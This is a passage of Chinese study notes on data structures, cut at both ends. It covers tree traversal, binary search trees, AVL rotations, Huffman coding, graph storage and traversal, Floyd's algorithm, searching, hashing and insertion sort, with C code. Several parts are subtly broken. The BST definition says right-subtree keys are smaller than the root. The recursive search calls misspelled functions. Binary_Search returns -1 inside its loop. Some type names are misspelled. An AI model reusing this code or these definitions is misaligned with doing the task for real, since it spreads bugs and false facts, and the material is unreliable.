title="树的后根遍历"></a>树的后根遍历</h3><p>若树非空，先依次对每颗子树进行后根遍历，最后再访问根结点<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(TreeNode *R)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(R!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(R还有下一个子树T)&#123;</span><br><span class="line">PostOrder(T);</span><br><span class="line">&#125;</span><br><span class="line">   visit(R);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br><mark>树的后根遍历序列与这棵树相应二叉树的中序序列相同</mark></p><h3 id="树的层次遍历-用队列实现"><a href="#树的层次遍历-用队列实现" class="headerlink" title="树的层次遍历(用队列实现)"></a>树的层次遍历(用队列实现)</h3><p>1.若树非空，则根节点入队<br>2.若队列非空，队头元素出队并访问，同时将该元素的孩子依次入队<br>3重复2直至队列为空</p><p>层次遍历—广度优先遍历<br>先根和后根—层次优先遍历</p><h3 id="森林的先序遍历"><a href="#森林的先序遍历" class="headerlink" title="森林的先序遍历"></a>森林的先序遍历</h3><p>效果等同于依次对各个树进行<mark>先根遍历</mark><br>效果等同与依次对二叉树的<mark>先序遍历</mark></p><h3 id="森林的中序遍历"><a href="#森林的中序遍历" class="headerlink" title="森林的中序遍历"></a>森林的中序遍历</h3><p>效果等同于依次对各个树进行<mark>后根遍历</mark><br>效果等同于依次对二叉树的<mark>中序遍历</mark><br>紫页p139<br>| 树    | 森林    |二叉树     |<br>| :-: | :-: | :-: |<br>|  先根遍历   |  先序遍历   | 先序遍历    |<br>|   后根遍历  | 中序遍历    | 中序遍历    |</p><h2 id="5-14-二叉排序树"><a href="#5-14-二叉排序树" class="headerlink" title="5.14 二叉排序树"></a>5.14 二叉排序树</h2><p>二叉排序树，又称二叉查找树(BST)<br>左子树上所有结点的关键字均小于根节点的关键字<br>右子树上所有结点的关键字均小于根节点的关键字<br>左子树和右子树又各是一棵二叉排序树<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span>&#123;</span></span><br><span class="line"><span class="type">int</span> key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BSTNode,*BSTree;</span><br><span class="line"></span><br><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(T!=<span class="literal">NULL</span>&amp;&amp;key!=T-&gt;key)&#123;</span><br><span class="line"><span class="keyword">if</span>(key&lt;T-&gt;key) T=T-&gt;lchild;</span><br><span class="line"><span class="keyword">else</span> T=T-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>递归实现：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(key==T-&gt;key)&#123;</span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;key)&#123;</span><br><span class="line"><span class="keyword">return</span> BSTSearch(T-&gt;lchild,key);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> BSTSrearch(T-&gt;rchild,key);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>worst O(h)<br>best O(1)</p><h3 id="二叉树的插入"><a href="#二叉树的插入" class="headerlink" title="二叉树的插入"></a>二叉树的插入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BST_Insert</span><span class="params">(BSTree &amp;T,<span class="type">int</span> k)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">T=(BSTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSTNode));</span><br><span class="line">T-&gt;key=k;</span><br><span class="line">T-&gt;lchild=T-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(k==T-&gt;key)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(k&lt;T-&gt;key)&#123;</span><br><span class="line"><span class="keyword">return</span> BST_Insert(T-&gt;lchild,k);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> BST_Insert(T-&gt;rchild,k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>worst O(h)</p><h3 id="二叉排序树的构造"><a href="#二叉排序树的构造" class="headerlink" title="二叉排序树的构造"></a>二叉排序树的构造</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Creat_BST</span><span class="params">(BSTree &amp;T,<span class="type">int</span> str[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line">T=<span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">BST_Insert(T,str[i]);</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉排序树的删除"><a href="#二叉排序树的删除" class="headerlink" title="二叉排序树的删除"></a>二叉排序树的删除</h3><p>先搜索找到目标结点<br>1.若被删除结点z是叶结点，则直接删除，不会破坏二叉排序树的性质<br>2.若结点z只有一棵左子树和右子树，则让z的子树成为z父节点的子树，替代z的位置<br>3.若结点z有左，右两棵子树，则令z的直接后继(或直接前驱)替代z，然后从二叉排序树中删去这个直接后继(或直接前驱)，这样就转换成了第一或第二种情况<br>左子树结点值&lt;根结点值&lt;右子树结点值<br>EXP：查找右子树中最小的，即进行中序遍历，可以得到一个递增的有序序列</p><p>z的后继:z的右子树中最左下结点(该节点一定没有左子树)<br>z的前驱:z的左子树中最右下结点(该节点一定没有右子树)<br>参照线索二叉树</p><h3 id="查找效率分析"><a href="#查找效率分析" class="headerlink" title="查找效率分析"></a>查找效率分析</h3><p>查找长度—在查找运算中，需要对比关键字的次数称为查找长度，反映了查找操作时间复杂度<br>计算题:查找成功/失败的平均查找长度ASL(Average Search Length)</p><h2 id="5-15-平衡二叉树-选择题"><a href="#5-15-平衡二叉树-选择题" class="headerlink" title="5.15 平衡二叉树(选择题)"></a>5.15 平衡二叉树(选择题)</h2><p>AVL树-树上任一结点的左子树和右子树的高度之差不超过1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span>&#123;</span></span><br><span class="line"><span class="type">int</span> key;</span><br><span class="line"><span class="type">int</span> balance;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;AVLNode,*AVLTree; </span><br></pre></td></tr></table></figure><br>从插入点往回找到第一个不平衡结点，调整以该结点为根的子树</p><h3 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h3><p>在A的左孩子的左子树中插入导致不平衡<br>1）LL平衡旋转（右单旋转）。由于在结点A的左孩子（L）的左子树（L）上插入了新结点，A的平衡因子<br>由1增至2，导致以A为根的子树失去平衡，需要一次向右的旋转操作。将A的左孩子B向右上旋转代替A成<br>为根结点，将A结点向右下旋转成为B的右子树的根结点，而B的原右子树则作为A结点的左子树。<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/2318544229484.png" alt=""></p><h3 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h3><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/4645544217351.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/3793846237517.png" alt=""></p><h3 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h3><p>先左旋后右旋<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/1869848230186.png" alt=""></p><h3 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h3><p>先右旋后左旋<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/3194549226741.png" alt=""><br>可以证明含有n个结点的平衡二叉树的最大深度为o（log2n)，平衡二叉树的平均查找长度为o（log2n）</p><h2 id="5-16-哈夫曼树"><a href="#5-16-哈夫曼树" class="headerlink" title="5.16 哈夫曼树"></a>5.16 哈夫曼树</h2><p>结点的权:某种现实含义的数值(如:表示结点的重要性等)<br>结点的带权路径长度:从树的根到该结点的路径长度(经过的边数)与该结点上权值的乘积<br>树的带权路径长度:树中所有<mark>叶节点</mark>的带权路径长度之和 WPL<br>在含有n个带权叶结点的二叉树中，其中带权路径长度(WPL)最小的二叉树称为哈夫曼树，也称最优二叉树</p><h3 id="哈夫曼的构造"><a href="#哈夫曼的构造" class="headerlink" title="哈夫曼的构造"></a>哈夫曼的构造</h3><p>很简单，最小的权值结点先相加，依次类推<br>1.每个初始结点最终都成为叶结点，且权值最小的结点到根结点的路径长度最大<br>2.哈夫曼树的结点总数为2n-1<br>3.哈夫曼树中不存在度为1的结点<br>4.哈夫曼树并不唯一。但WPL必然相同为最优</p><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><p>可变长度编码—允许对不同字符用不等长的二进制位表示<br>若没有一个编码是另一个编码的前缀，则称这样的编码为前缀编码<br>前缀编码无歧义<br>有哈夫曼树得到哈夫曼编码—字符集中的每个字符作为一个<mark>叶子结点</mark>，各个字符出现的频度作为结点的权值，根据之前介绍的方法构造哈夫曼树<br>考点:将字符频次作为字符结点权值，构造哈夫曼树，即可得哈夫曼编码，可用于数据压缩</p><h1 id="6-图"><a href="#6-图" class="headerlink" title="6.图"></a>6.图</h1><h2 id="6-2-邻接矩阵法"><a href="#6-2-邻接矩阵法" class="headerlink" title="6.2 邻接矩阵法"></a>6.2 邻接矩阵法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> Vex[MaxVertexNum];</span><br><span class="line"><span class="type">int</span> Edge[MaxVertexNum][MaxVertexNum];</span><br><span class="line"><span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;MGraph; </span><br></pre></td></tr></table></figure><p>无向图:<br>第i个结点的度=第i行(或第i列)的非零元素个数<br>有向图:<br>第i个结点的出度=第i行的非零元素个数<br>第i个结点的入度=第i列的非零元素个数<br>第i个结点的度=第i行，第i列的非零元素个数之和</p><p>邻接矩阵法存储带权图:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100     <span class="comment">//顶点数目的最大值 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFINITY 最大的int值  <span class="comment">//宏定义常量&quot;无穷&quot; </span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> VertexType;    <span class="comment">//顶点的数据类型 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> EdgeType;   <span class="comment">//带权图中边上权值的数据类型 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">VertexType Vex[MaxVertexNum]; <span class="comment">//顶点 </span></span><br><span class="line">EdgeType Edge[MaxVertexNum][MaxVertexNum]; <span class="comment">//边的权 </span></span><br><span class="line"><span class="type">int</span> vexnum,arcnum; <span class="comment">//图的当前顶点数和弧数 </span></span><br><span class="line">&#125;MGraph; </span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/4995447151059.png" alt=""><br>不适合存储稀疏图</p><h2 id="6-3-邻接表法"><a href="#6-3-邻接表法" class="headerlink" title="6.3 邻接表法"></a>6.3 邻接表法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用邻接表存储的图 </span></span><br><span class="line"><span class="comment">//用邻接表存储的图 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">AdjList vertices;</span><br><span class="line"><span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;ALGraph;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//&quot;边/弧&quot;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>&#123;</span></span><br><span class="line"><span class="type">int</span> adjvex;   <span class="comment">//边/弧指向哪个结点 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">next</span>;</span>  <span class="comment">//指向下一条弧的指针 </span></span><br><span class="line"><span class="comment">//InfoType info;       //边权值 </span></span><br><span class="line">&#125;ArcNode; </span><br><span class="line"></span><br><span class="line"><span class="comment">//&quot;顶点&quot;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>&#123;</span></span><br><span class="line">VertexType data; <span class="comment">//顶点信息 </span></span><br><span class="line">ArvNode *first; <span class="comment">//第一条边/弧 </span></span><br><span class="line">&#125;VNode,Adjist[MaxVertexNum]; </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/1781456169485.png" alt=""><br>比较:<a href="#孩子表示法(顺序＋链式存储">孩子表示法(顺序＋链式存储)</a>)<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/5086101167352.png" alt=""></p><h2 id="6-4-十字链表-邻接多重表"><a href="#6-4-十字链表-邻接多重表" class="headerlink" title="6.4 十字链表,邻接多重表"></a>6.4 十字链表,邻接多重表</h2><h2 id="6-5-图的基本操作"><a href="#6-5-图的基本操作" class="headerlink" title="6.5  图的基本操作"></a>6.5  图的基本操作</h2><h2 id="6-6-图的广度优先遍历-BFS"><a href="#6-6-图的广度优先遍历-BFS" class="headerlink" title="6.6 图的广度优先遍历(BFS)"></a>6.6 图的广度优先遍历(BFS)</h2><p>1.找到与一个顶点相邻的所有顶点<br>2.标记哪些顶点被访问过<br>3.需要一个辅助队列<br>FirstNeighbor(G,x)<br>NextNeighbor(G,x,y)</p><p>对于无向图,调用BFS函数的次数=连通分量数<br>邻接矩阵存储的图:`时间复杂度=O(|V|^2)<br>邻接表存储的图:时间复杂度=O(|V|+|E|)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM]; <span class="comment">//访问标记数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraverse</span><span class="params">(Graph G)</span>&#123; <span class="comment">//对图G进行广度优先遍历 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexum;++i)&#123; </span><br><span class="line">visited[i]=FALSE;  <span class="comment">//访问标记数组初始化 </span></span><br><span class="line">&#125;</span><br><span class="line">InitQueue(Q); <span class="comment">//初始化辅助队列Q </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;   <span class="comment">//从0号顶点开始遍历 </span></span><br><span class="line"><span class="keyword">if</span>(!visited[i])&#123;  <span class="comment">//对每个连通分量调用一次BFS </span></span><br><span class="line">BFS(G,i); <span class="comment">//vi未访问过,从vi开始BFS </span></span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//广度优先遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">visit(v);    <span class="comment">//访问初始顶点v </span></span><br><span class="line">visited[v]=TRUE; <span class="comment">//对v做已访问标记 </span></span><br><span class="line">Enqueue(Q,v);   <span class="comment">//顶点v入队列Q </span></span><br><span class="line"><span class="keyword">while</span>(!isEmpty(Q))&#123;</span><br><span class="line">DeQueue(Q,v);  <span class="comment">//顶点v出队列 </span></span><br><span class="line"><span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,v,w))&#123;</span><br><span class="line"><span class="comment">//检测v所有邻接点 </span></span><br><span class="line"><span class="keyword">if</span>(!visited[w])&#123;  <span class="comment">//w为v的尚未访问的邻接顶点 </span></span><br><span class="line">visit(w);  <span class="comment">//访问顶点w </span></span><br><span class="line">visited[w]=TRUE; <span class="comment">//对w做已访问标记 </span></span><br><span class="line">EnQueue(Q,w); <span class="comment">//顶点w入队列 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br>广度优先生成树由广度优先遍历过程确定.由于邻接表的表示方式不唯一,因此基于邻接表的广度优先生成树也不唯一.<br>对非连通图的广度优先遍历,可得到广度优先生成森林</p><h2 id="6-7-深度优先遍历-DFS"><a href="#6-7-深度优先遍历-DFS" class="headerlink" title="6.7 深度优先遍历(DFS)"></a>6.7 深度优先遍历(DFS)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM]; <span class="comment">//访问标记数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraverse</span><span class="params">(Graph G)</span>&#123; <span class="comment">//对图G进行深度优先遍历 </span></span><br><span class="line"><span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexum;++v)&#123; </span><br><span class="line">visited[v]=FALSE;  <span class="comment">//访问标记数组初始化 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line"><span class="keyword">if</span>(!visited[v])&#123;</span><br><span class="line">DFS(G,v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">visit(v);</span><br><span class="line">visited[v]=TRUE;</span><br><span class="line"><span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighor(G,v,w))&#123;</span><br><span class="line"><span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">DFS(G,w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>邻接矩阵存储的图:`时间复杂度=O(|V|^2)<br>邻接表存储的图:时间复杂度=O(|V|+|E|)</p><h2 id="6-8-最小生成树"><a href="#6-8-最小生成树" class="headerlink" title="6.8 最小生成树"></a>6.8 最小生成树</h2><h2 id="6-9-11-图算法"><a href="#6-9-11-图算法" class="headerlink" title="6.9-11 图算法"></a>6.9-11 图算法</h2><p>Floyd<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//准备工作,根据图的信息初始化矩阵A和path </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++)&#123;   <span class="comment">//考虑以Vk为中转点 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;   <span class="comment">//遍历整个矩阵,i为行号,j为列号 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[i][j]&gt;A[i][k]+A[k][j])&#123;   <span class="comment">//以Vk为中转点的路径更短 </span></span><br><span class="line">A[i][j]=A[i][k]+A[k][j];   <span class="comment">//更新最短路径长度 </span></span><br><span class="line">path[i][j]=k;   <span class="comment">//中转点 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/5979441161070.png" alt=""></p><h1 id="7-查找"><a href="#7-查找" class="headerlink" title="7.查找"></a>7.查找</h1><h2 id="7-1-查找的基本概念"><a href="#7-1-查找的基本概念" class="headerlink" title="7.1 查找的基本概念"></a>7.1 查找的基本概念</h2><p>仅关注查找速度-静态查找表<br>除了查找速度,也要关注插/删操作是否方便实现</p><h2 id="7-2-顺序查找"><a href="#7-2-顺序查找" class="headerlink" title="7.2 顺序查找"></a>7.2 顺序查找</h2><h2 id="7-3-折半查找"><a href="#7-3-折半查找" class="headerlink" title="7.3 折半查找"></a>7.3 折半查找</h2><p>仅适用于有序的顺序表<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">ElemType *elem;</span><br><span class="line"><span class="type">int</span> TableLen;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Binary_Search</span><span class="params">(SSTable L,ElemType key)</span>&#123;</span><br><span class="line"><span class="type">int</span> low=<span class="number">0</span>,high=L.TableLen<span class="number">-1</span>,mid;</span><br><span class="line"><span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">mid=(low+high)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(L.elem[mid]==key)&#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(L.elem[mid]&gt;key)&#123;</span><br><span class="line">high=mid<span class="number">-1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">low=mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>右子树结点数-左子树结点数=0或1<br>折半查找的判定树一定是平衡二叉树<br>折半查找的判定数中,只有最下面一层是不满的<br>因此,元素个数为n时树高h=[log2(n+1)]<br>满足二叉树的定义,失败结点为n+1</p><h2 id="7-4-分块查找"><a href="#7-4-分块查找" class="headerlink" title="7.4 分块查找"></a>7.4 分块查找</h2><p>分块查找,又称索引顺序查找,算法过程如下:<br>1.在索引表中确定待查记录所属的分块(可顺序.可折半)<br>2.在块内顺序查找<br>若索引表中不包含目标关键字,则<mark>折半查找</mark>索引表最终停在low&gt;high,要在<mark>low所指分块中查找</mark><br>原因:最终low左边一定小于目标关键字,high右边一定大于目标关键字.而分块存储的索引表中保存的是各个分块的最大关键字<br>顺序查找索引表 ASL=(b+1)/2+(s+1)/2 当s=√n +1</p><h2 id="7-5-7-B树"><a href="#7-5-7-B树" class="headerlink" title="7.5-7 B树"></a>7.5-7 B树</h2><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/2758507141145.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/1188517169571.png" alt=""></p><h2 id="7-8-9-散列"><a href="#7-8-9-散列" class="headerlink" title="7.8-9 散列"></a>7.8-9 散列</h2><p>1.线性探测法:发生冲突时,每次往后探测相邻的下一个单元是否为空<br>注意:采用”开放定制法”时,删除结点不能简单地将被删除结点的空间置为空,否则将截断在它之后填入散列表的同义词结点的查找路径,可以做一个”删除标记”,进行逻辑删除<br>2.平方探测法.d=….,k^2,-k^2<br>散列表长度m必须是一个可以表示成4j+3的素数,才能探测到所有位置<br>3.伪随机数序列法</p><h1 id="8-排列"><a href="#8-排列" class="headerlink" title="8.排列"></a>8.排列</h1><h2 id="8-1-排序的基本概念"><a href="#8-1-排序的基本概念" class="headerlink" title="8.1 排序的基本概念"></a>8.1 排序的基本概念</h2><p>排序算法的稳定性<br>关键字相同的元素在排序之后相对位置不变<br>内部排序:数据都在内存中<br>外部排序:数据太多,无法全部放入内存</p><h2 id="8-2-插入排序"><a href="#8-2-插入排序" class="headerlink" title="8.2 插入排序"></a>8.2 插入排序</h2><p>每次将一个待排序的记录按其关键字大小插入到前面已排好序的子序列中,直到全部记录插入完成.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">InsertSort</span><span class="params">(<span class="type">int</span> A[],<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span>  i,j,temp;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span 